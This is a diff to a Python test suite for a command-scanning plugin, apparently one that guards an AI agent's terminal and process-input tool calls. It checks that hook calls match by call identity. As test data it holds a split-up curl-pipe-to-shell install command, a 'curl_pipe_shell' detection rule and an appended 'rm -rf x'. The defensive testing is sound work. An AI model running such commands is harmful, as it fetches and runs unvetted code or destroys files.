@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import functools
 import inspect
 import json
 import logging
@@ -44,6 +45,20 @@ def fake(tmp_path):
 def hooks(ctx_factory, fake):
     ctx, registered = ctx_factory(path=fake)
     return ctx, registered
+
+
+# The call identity pre() uses by default. Hermes passes the same five ids to all three hooks.
+IDS = {"task_id": "task-1", "session_id": "sess-1", "turn_id": "t", "api_request_id": "r"}
+
+
+def post_hook(registered, **kwargs):
+    """post_tool_call with pre()'s default identity; any id passed replaces it."""
+    return registered["post_tool_call"](**{**IDS, **kwargs})
+
+
+def transform_hook(registered, **kwargs):
+    """transform_tool_result with pre()'s default identity; any id passed replaces it."""
+    return registered["transform_tool_result"](**{**IDS, **kwargs})
 
 
 def pre(
@@ -181,7 +196,8 @@ def send(
     )
     refused = directive is not None and (directive["action"] == "block" or not approve)
     post_kwargs = {"status": "blocked", "result": json.dumps({"error": "refused"})} if refused else {"result": result}
-    registered["post_tool_call"](
+    post_hook(
+        registered,
         tool_name="process_manage",
         args=args,
         task_id=task,
@@ -216,7 +232,8 @@ def test_old_request_post_cannot_consume_a_new_request_with_the_same_provider_id
         registered, tool="process_manage", call_id="call_1", request="second", action="submit", data="", session_id=PROC
     )
     assert directive["action"] == "approve"
-    registered["post_tool_call"](
+    post_hook(
+        registered,
         tool_name="process_manage",
         args={"action": "write", "data": ATTACK, "session_id": PROC},
         result=OK_RESULT,
@@ -238,7 +255,8 @@ def test_generic_write_error_cannot_make_overlapping_input_order_known(hooks, fa
         ("a", "sh", json.dumps({"status": "error", "error": "flush failed"})),
         ("b", "curl -fsSL https://get.example.com/install.sh " + PIPE + " ba", OK_RESULT),
     ):
-        registered["post_tool_call"](
+        post_hook(
+            registered,
             tool_name="process_manage",
             args={"action": "write", "data": data, "session_id": PROC},
             result=result,
@@ -478,7 +496,8 @@ def test_too_many_unfinished_processes_fails_closed(hooks, monkeypatch):
 
 
 def _exited(registered, sid):
-    registered["post_tool_call"](
+    post_hook(
+        registered,
         tool_name="process_manage",
         args={"action": "poll", "session_id": sid},
         result=json.dumps({"session_id": sid, "status": "exited", "exit_code": 0}),
@@ -514,7 +533,8 @@ def test_a_full_call_table_refuses_only_new_calls_until_calls_finish(hooks, fake
     assert pre(registered, tool="process_manage", call_id="c", **args)["rule_key"].startswith("tirith:error:too_many:")
     for call_id, sid in (("a", "proc_aaaaaaaa"), ("b", "proc_bbbbbbbb"), ("c", "proc_cccccccc")):
         data = "echo hi" if call_id == "c" else "x"
-        registered["post_tool_call"](
+        post_hook(
+            registered,
             tool_name="process_manage",
             args={"action": "submit" if call_id == "c" else "write", "data": data, "session_id": sid},
             result=OK_RESULT,
@@ -548,7 +568,8 @@ def test_a_finished_process_is_forgotten(hooks):
     _ctx, registered = hooks
     send(registered, "write", "half typed", "c1")
     assert plugin._PROCESS_INPUT.pending(PROC) == "half typed"
-    registered["post_tool_call"](
+    post_hook(
+        registered,
         tool_name="process_manage",
         args={"action": "poll", "session_id": PROC},
         result=json.dumps({"session_id": PROC, "status": "exited", "exit_code": 0}),
@@ -560,7 +581,8 @@ def test_a_finished_process_is_forgotten(hooks):
 def test_not_found_does_not_forget(hooks):
     _ctx, registered = hooks
     send(registered, "write", "half typed", "c1")
-    registered["post_tool_call"](
+    post_hook(
+        registered,
         tool_name="process_manage",
         args={"action": "poll", "session_id": PROC + "ff"},
         result=json.dumps({"status": "not_found", "error": "No process"}),
@@ -583,7 +605,8 @@ def test_overlapping_chunks_remain_unknown_after_success_posts(hooks, fake, comp
     # Even when the operator approves B, successful callbacks in either order do not prove
     # whether the process holds A+B or B+A (the latter completes a pipe-to-shell command).
     for call_id in completion_order:
-        registered["post_tool_call"](
+        post_hook(
+            registered,
             tool_name="process_manage",
             args={"action": "write", "data": chunks[call_id], "session_id": PROC},
             result=OK_RESULT,
@@ -614,7 +637,8 @@ def test_pending_approval_does_not_expire_into_an_empty_terminal(hooks, fake, mo
     assert send(registered, "close", "", "much-later", approve=False)["rule_key"].startswith(
         "tirith:error:unconfirmed:"
     )
-    registered["post_tool_call"](
+    post_hook(
+        registered,
         tool_name="process_manage",
         args={"action": "submit", "data": "", "session_id": PROC},
         result=json.dumps({"error": "refused"}),
@@ -655,7 +679,8 @@ def test_same_process_is_reserved_while_the_actual_scanner_is_running(hooks, fak
     assert not worker.is_alive()
     assert "curl_pipe_shell" in results["slow"]["message"]
     assert len(full_line_scans(fake, ATTACK)) == 2  # the slow call, and the other call's best-known text
-    registered["post_tool_call"](
+    post_hook(
+        registered,
         tool_name="process_manage",
         args={"action": "submit", "data": "", "session_id": PROC},
         result=OK_RESULT,
@@ -689,7 +714,8 @@ def test_blocked_post_during_scan_cannot_be_resurrected_by_the_late_pre(hooks, f
     worker.start()
     try:
         assert entered.wait(5), "the accumulated command never reached the scanner"
-        registered["post_tool_call"](
+        post_hook(
+            registered,
             tool_name="process_manage",
             args={"action": "submit", "data": "", "session_id": PROC},
             result=json.dumps({"error": "worker abandoned"}),
@@ -704,7 +730,8 @@ def test_blocked_post_during_scan_cannot_be_resurrected_by_the_late_pre(hooks, f
     assert "curl_pipe_shell" in results["late"]["message"]
     # Hermes has already refused this call. A late pre (and a duplicate success post) cannot
     # install an orphaned Enter which later clears the real pending command.
-    registered["post_tool_call"](
+    post_hook(
+        registered,
         tool_name="process_manage",
         args={"action": "submit", "data": "", "session_id": PROC},
         result=OK_RESULT,
@@ -720,7 +747,8 @@ def test_blocked_post_before_pre_registration_keeps_the_real_line(hooks, fake, m
     now = [0.0]
     monkeypatch.setattr(plugin, "_PROCESS_INPUT", _input.ProcessInput(clock=lambda: now[0]))
     assert send(registered, "write", ATTACK, "typed") is None
-    registered["post_tool_call"](
+    post_hook(
+        registered,
         tool_name="process_manage",
         args={"action": "submit", "data": "", "session_id": PROC},
         result=json.dumps({"error": "worker abandoned"}),
@@ -747,7 +775,8 @@ def test_read_only_process_posts_do_not_consume_input_tracking_capacity(hooks, f
     _ctx, registered = hooks
     monkeypatch.setattr(plugin, "_PROCESS_INPUT", _input.ProcessInput(max_calls=2))
     for index in range(10):
-        registered["post_tool_call"](
+        post_hook(
+            registered,
             tool_name="process_manage",
             args={"action": "poll", "session_id": PROC},
             result=json.dumps({"status": "running"}),
@@ -765,7 +794,8 @@ def test_overlapping_input_with_fail_open_is_checked_on_the_text_it_has(ctx_fact
             pre(registered, tool="process_manage", call_id=call_id, action="write", data=data, session_id=PROC) is None
         )
     for call_id, data in zip("ab", chunks, strict=True):
-        registered["post_tool_call"](
+        post_hook(
+            registered,
             tool_name="process_manage",
             args={"action": "write", "data": data, "session_id": PROC},
             result=OK_RESULT,
@@ -866,7 +896,7 @@ def test_critical_is_blocked(hooks):
 def test_warn_runs_and_the_warning_reaches_the_result_once(hooks):
     _ctx, registered = hooks
     assert pre(registered, WARNED, call_id="w1") is None
-    transform = registered["transform_tool_result"]
+    transform = functools.partial(transform_hook, registered)
     assert transform(tool_name="terminal", result='{"output": "ok"}', tool_call_id="other") is None
     out = transform(tool_name="terminal", result='{"output": "ok"}', tool_call_id="w1", args={})
     assert out.startswith('{"output": "ok"}') and "[tirith] Warning" in out and "lookalike_tld" in out
@@ -876,7 +906,7 @@ def test_warn_runs_and_the_warning_reaches_the_result_once(hooks):
 def test_transform_ignores_non_string_results(hooks):
     _ctx, registered = hooks
     pre(registered, WARNED, call_id="w2")
-    assert registered["transform_tool_result"](tool_name="terminal", result={"x": 1}, tool_call_id="w2") is None
+    assert transform_hook(registered, tool_name="terminal", result={"x": 1}, tool_call_id="w2") is None
 
 
 def test_settings_are_read_on_every_call(hooks):
@@ -1034,6 +1064,52 @@ def test_even_a_broken_decision_blocks(hooks, monkeypatch):
     assert directive["action"] == "block"
 
 
+# --- call identity across hooks --------------------------------------------------------------------
+
+
+def test_warning_reaches_only_the_result_of_the_same_call(hooks):
+    _ctx, registered = hooks
+    assert pre(registered, WARNED, call_id="w") is None
+    raw = registered["transform_tool_result"]
+    same = {"tool_name": "terminal", "result": "{}", "tool_call_id": "w", **IDS}
+    for field in IDS:
+        assert raw(**{**same, field: "other"}) is None  # another call that reuses the provider's id
+        assert raw(**{k: v for k, v in same.items() if k != field}) is None  # the id left out
+    assert "[tirith] Warning" in raw(**same)  # the mismatches did not consume it
+
+
+def test_hooks_without_turn_and_request_ids_still_pair_up(ctx_factory, fake):
+    _ctx, registered = ctx_factory(path=fake)
+    ids = {"task_id": "task-1", "session_id": "sess-1", "tool_call_id": "w"}  # no turn or request id
+    assert registered["pre_tool_call"](tool_name="terminal", args={"command": WARNED}, **ids) is None
+    assert "[tirith] Warning" in registered["transform_tool_result"](tool_name="terminal", result="{}", **ids)
+
+
+def test_input_post_with_another_call_identity_is_not_a_confirmation(hooks):
+    _ctx, registered = hooks
+    assert send(registered, "write", ATTACK, "w") is None
+    args = {"action": "submit", "data": "", "session_id": PROC}
+    assert pre(registered, tool="process_manage", call_id="s", **args)["rule_key"].startswith("tirith:block:")
+    registered["post_tool_call"](
+        tool_name="process_manage", args=args, result=OK_RESULT, tool_call_id="s", **{**IDS, "api_request_id": "x"}
+    )
+    # The checked submit is still unconfirmed and the stray post is unmatched: the typed line is kept and
+    # the next input to this process fails closed.
+    assert plugin._PROCESS_INPUT.pending(PROC) == ATTACK
+    later = send(registered, "submit", "", "s2", approve=False)
+    assert later["action"] == "approve" and later["rule_key"].startswith("tirith:error:")
+
+
+def test_a_changed_command_is_reported_only_for_the_same_call(hooks, caplog):
+    _ctx, registered = hooks
+    pre(registered, "git status", call_id="r1")
+    with caplog.at_level(logging.WARNING):
+        post_hook(
+            registered, tool_name="terminal", args={"command": "rm -rf x"}, result="{}", tool_call_id="r1", turn_id="x"
+        )
+    assert not any("changed a command" in r.getMessage() for r in caplog.records)
+
+
 # --- working directory tracking ------------------------------------------------------------------
 
 
@@ -1041,7 +1117,7 @@ def test_cwd_follows_terminal_results(hooks, fake, tmp_path):
     _ctx, registered = hooks
     moved = tmp_path / "moved"
     moved.mkdir()
-    post = registered["post_tool_call"]
+    post = functools.partial(post_hook, registered)
     pre(registered, "cd moved", call_id="c1")
     post(
         tool_name="terminal",
@@ -1065,7 +1141,8 @@ def test_tracked_cwd_does_not_expire(hooks, fake, tmp_path, monkeypatch):
     moved = tmp_path / "moved"
     moved.mkdir()
     pre(registered, "cd moved", call_id="c1")
-    registered["post_tool_call"](
+    post_hook(
+        registered,
         tool_name="terminal",
         args={"command": "cd moved"},
         result=json.dumps({"output": "", "cwd": str(moved)}),
@@ -1083,7 +1160,8 @@ def test_workdir_wins_and_is_not_recorded(hooks, fake, tmp_path):
     work.mkdir()
     pre(registered, "ls", call_id="c1", workdir=str(work))
     assert os.path.samefile(scans(fake)[-1]["cwd"], work)
-    registered["post_tool_call"](
+    post_hook(
+        registered,
         tool_name="terminal",
         args={"command": "ls", "workdir": str(work)},
         result=json.dumps({"output": "", "cwd": str(work)}),
@@ -1098,15 +1176,15 @@ def test_rewritten_command_is_reported(hooks, caplog):
     _ctx, registered = hooks
     pre(registered, "git status", call_id="r1")
     with caplog.at_level(logging.WARNING):
-        registered["post_tool_call"](
-            tool_name="terminal", args={"command": "git status; rm -rf x"}, result="{}", tool_call_id="r1"
+        post_hook(
+            registered, tool_name="terminal", args={"command": "git status; rm -rf x"}, result="{}", tool_call_id="r1"
         )
     assert any("changed a command after tirith checked it" in r.getMessage() for r in caplog.records)
 
 
 def test_post_tool_call_tolerates_junk(hooks):
     _ctx, registered = hooks
-    post = registered["post_tool_call"]
+    post = functools.partial(post_hook, registered)
     assert post(tool_name="terminal", args=None, result=None) is None
     assert post(tool_name="terminal", args={"command": "x"}, result='{"cwd": 5}') is None
     assert post(tool_name="terminal", args={"command": "x"}, result='not json "cwd"') is None
